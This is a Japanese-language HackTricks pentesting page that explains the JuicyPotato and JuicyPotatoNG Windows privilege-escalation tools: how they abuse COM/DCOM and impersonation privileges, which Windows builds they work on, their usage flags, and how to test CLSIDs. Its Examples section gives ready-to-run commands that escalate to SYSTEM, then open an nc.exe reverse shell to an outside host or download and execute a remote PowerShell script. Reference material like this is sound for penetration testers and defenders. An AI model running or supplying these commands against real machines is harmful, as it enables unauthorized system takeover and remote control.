# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > JuicyPotato はレガシーです。通常、Windows 10 1803 / Windows Server 2016 までの Windows バージョンで動作します。Windows 10 1809 / Server 2019 以降で提供された Microsoft の変更により、元の technique は動作しなくなりました。これらのビルド以降では、PrintSpoofer、RoguePotato、SharpEfsPotato/EfsPotato、GodPotato などの modern alternatives を検討してください。最新の options と usage については、以下のページを参照してください。

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato（golden privileges の abuse） <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_[_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG) の改良版で、少し juice を加えたもの、つまり **Windows Service Accounts から NT AUTHORITY\SYSTEM への、もう1つの Local Privilege Escalation tool**_ です。<sup>[[1]](#references)</sup>

#### juicypotato は [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts) から download できます

### Compatibility の簡単な notes

- 現在の context に SeImpersonatePrivilege または SeAssignPrimaryTokenPrivilege がある場合、Windows 10 1803 および Windows Server 2016 まで reliable に動作します。
- Windows 10 1809 / Windows Server 2019 以降では、Microsoft の hardening により動作しません。これらの build では、上記でリンクした alternatives を優先してください。

### Summary <a href="#summary" id="summary"></a>

[**juicy-potato Readme より**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**<sup>[[1]](#references)</sup>

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) とその [variants](https://github.com/decoder-it/lonelypotato) は、[`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) が `127.0.0.1:6666` に MiTM listener を持ち、`SeImpersonate` または `SeAssignPrimaryToken` privileges がある場合に基づく privilege escalation chain を利用します。Windows build の review 中に、`BITS` が意図的に disabled で、port `6666` が使用されている環境を発見しました。

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) を weaponize することにしました。**Juicy Potato の登場です。**

> theory については、[Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) を参照し、links と references の chain をたどってください。<sup>[[4]](#references)</sup>

`BITS` 以外にも abuse できる COM servers がいくつか存在することを発見しました。必要な条件は次のとおりです。

1. 現在の user（通常は impersonation privileges を持つ「service user」）が instantiable である
2. `IMarshal` interface を implement している
3. elevated user（SYSTEM、Administrator、…）として run する

いくつかの Windows versions で testing を行った結果、[interesting CLSID’s](http://ohpe.it/juicy-potato/CLSID/) の extensive list を取得し、test しました。

### Juicy details <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato では次のことが可能です。<sup>[[1]](#references)</sup>

- **Target CLSID** _任意の CLSID を選択できます。_ [_こちら_](http://ohpe.it/juicy-potato/CLSID/) _に OS ごとに整理された list があります。_
- **COM Listening port** _任意の COM listening port を定義できます（marshalled hardcoded 6666 の代わり）。_
- **COM Listening IP address** _server を任意の IP に bind できます。_
- **Process creation mode** _impersonated user の privileges に応じて、次から選択できます。_
- `CreateProcessWithToken`（`SeImpersonate` が必要）
- `CreateProcessAsUser`（`SeAssignPrimaryToken` が必要）
- `both`
- **Process to launch** _exploitation が成功した場合に executable または script を launch します。_
- **Process Argument** _launch する process の arguments を customize します。_
- **RPC Server address** _stealthy な approach として、external RPC server に authenticate できます。_
- **RPC Server port** _external server に authenticate したい場合や、firewall が port `135` を block している場合に useful です。_
- **TEST mode** _主に testing purposes、つまり CLSIDs の testing 用です。DCOM を create し、token の user を print します。testing については_ [_こちら_](http://ohpe.it/juicy-potato/Test/) _を参照してください。_

### Usage <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### 最終的な考察 <a href="#final-thoughts" id="final-thoughts"></a>

[**juicy-potato Readmeより**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**<sup>[[1]](#references)</sup>

ユーザーが `SeImpersonate` または `SeAssignPrimaryToken` の権限を持っている場合、あなたは **SYSTEM** です。

これらすべての COM Servers の悪用を防ぐことは、ほぼ不可能です。`DCOMCNFG` を使用してこれらのオブジェクトの権限を変更することを考えられますが、幸運を祈ります。これは非常に困難です。

実際の解決策は、`* SERVICE` アカウントで実行される機密性の高いアカウントとアプリケーションを保護することです。`DCOM` を停止すれば、確実にこの exploit を阻止できますが、基盤となる OS に深刻な影響を与える可能性があります。

出典: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)<sup>[[3]](#references)</sup>

## JuicyPotatoNG (2022+)

JuicyPotatoNG は、以下を組み合わせることで、最新の Windows に JuicyPotato スタイルの local privilege escalation を再導入します。<sup>[[2]](#references)</sup>
- DCOM OXID resolution により、選択したポート上の local RPC server を使用し、従来のハードコードされた 127.0.0.1:6666 listener を回避する。
- SSPI hook により、RpcImpersonateClient を必要とせずに受信した SYSTEM authentication を capture および impersonate する。これにより、SeAssignPrimaryTokenPrivilege のみが存在する場合でも CreateProcessAsUser が使用可能になる。
- DCOM activation の制約を満たすための tricks（例: PrintNotify / ActiveX Installer Service classes を target にする場合、以前必要だった INTERACTIVE-group requirement）。

重要な注意事項（build によって挙動は変化します）。<sup>[[2]](#references)</sup>
- 2022年9月: 初期の technique は、「INTERACTIVE trick」を使用して、サポート対象の Windows 10/11 および Server targets で動作した。
- 2023年1月、authors による update: Microsoft はその後、INTERACTIVE trick を block した。別の CLSID ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) により exploitation が復活するが、authors の post によれば Windows 11 / Server 2022 でのみ利用可能。

Basic usage（その他の flags は help を参照）:
```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
# Useful helpers:
#  -b  Bruteforce all CLSIDs (testing only; spawns many processes)
#  -s  Scan for a COM port not filtered by Windows Defender Firewall
#  -i  Interactive console (only with CreateProcessAsUser)
```
Windows 10 1809 / Server 2019 を対象とし、classic JuicyPotato に patch が適用されている場合は、上部にリンクされている代替手段（RoguePotato、PrintSpoofer、EfsPotato/GodPotato など）を優先してください。NG は、build や service の状態によっては状況依存となる場合があります。

## Examples

注: 試行する CLSID の一覧については、[this page](https://ohpe.it/juicy-potato/CLSID/) を参照してください。

### nc.exe reverse shell を取得する
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell リバースシェル
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### 新しい CMD を起動する（RDP access がある場合）

![Powershell rev - 新しい CMD を起動する（RDP access がある場合）: 新しい CMD を起動する（RDP access がある場合）](<../../images/image (300).png>)

## CLSID の問題

JuicyPotato が使用するデフォルトの CLSID は**動作しない**ことが多く、exploit が失敗します。通常、**動作する CLSID**を見つけるには複数回試行する必要があります。特定の operating system で試す CLSID のリストを取得するには、次のページを確認してください。

- [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

### **CLSID の確認**

まず、juicypotato.exe 以外にいくつかの executable が必要です。

[Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) を download して PS session に load し、[GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1) を download して execute します。この script は、テスト可能な CLSID のリストを作成します。

次に、[test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat) を download し（CLSID リストと juicypotato executable への path を変更します）、execute します。すべての CLSID の試行が開始され、**port number が変化した場合、その CLSID が動作したことを意味します**。

動作する CLSID を parameter **-c** で**確認**します。

## 参考資料

- [1] [Juicy Potato README (ohpe/juicy-potato)](https://github.com/ohpe/juicy-potato/blob/master/README.md)
- [2] [Giving JuicyPotato a second chance: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)
- [3] [Juicy Potato project page (ohpe.it)](http://ohpe.it/juicy-potato/)
- [4] [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)

{{#include ../../banners/hacktricks-training.md}}
